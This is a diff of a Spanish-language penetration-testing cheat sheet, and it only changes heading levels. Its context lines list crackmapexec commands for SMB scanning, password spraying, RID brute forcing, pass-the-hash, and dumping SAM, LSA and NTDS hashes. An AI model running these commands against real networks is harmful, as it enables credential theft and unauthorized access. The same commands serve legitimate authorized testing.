@@ -5,7 +5,7 @@
 crackmapexec smb 192.168.1.0/24
 ```
 
-### SMB con credenciales a dominio WORKGROUP
+#### SMB con credenciales a dominio WORKGROUP
 ```
 crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP
 ```
@@ -15,12 +15,12 @@ crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP
 crackmapexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt
 ```
 
-### Spraying Attack con usuario y contraseña lineal
+#### Spraying Attack con usuario y contraseña lineal
 ```
 crackmapexec smb <IP-Address> -u users.txt -p passwd.txt --no-bruteforce --continue-on-success
 ```
 
-### Spraying Attack
+#### Spraying Attack
 ```
 crackmapexec smb <IP-Address> -u users.txt -p '<PASSWORD>' --continue-on-success
 ```
@@ -35,7 +35,7 @@ crackmapexec smb 192.168.1.0/24 -u '<USERNAME>' -p '<PASSWORD>'
 crackmapexec smb <IP-Address> -u 'null' -p ' ' --shares
 ```
 
-### Brute Force de usuarios
+#### Brute Force de usuarios
 ```
 crackmapexec smb <IP> -u 'guest' -p '' --rid-brute
 ```
@@ -50,12 +50,12 @@ crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --sam
 crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --ntds
 ```
 
-### Dumpear Hashes LSA
+#### Dumpear Hashes LSA
 ```
 crackmapexec smb <IP-Address> -u 'Administrator' -p '<PASSWORD>' --lsa
 ```
 
-### Dumpear Hashes NTD
+#### Dumpear Hashes NTD
 ```
 crackmapexec smb <IP-Address> -u 'Administrator' -H '<HASH-NT>' --ntds vss
 ```
@@ -65,7 +65,7 @@ crackmapexec smb <IP-Address> -u 'Administrator' -H '<HASH-NT>' --ntds vss
 crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' --local-auth
 ```
 
-### LAPS
+#### LAPS
 ```
 crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --laps
 ```
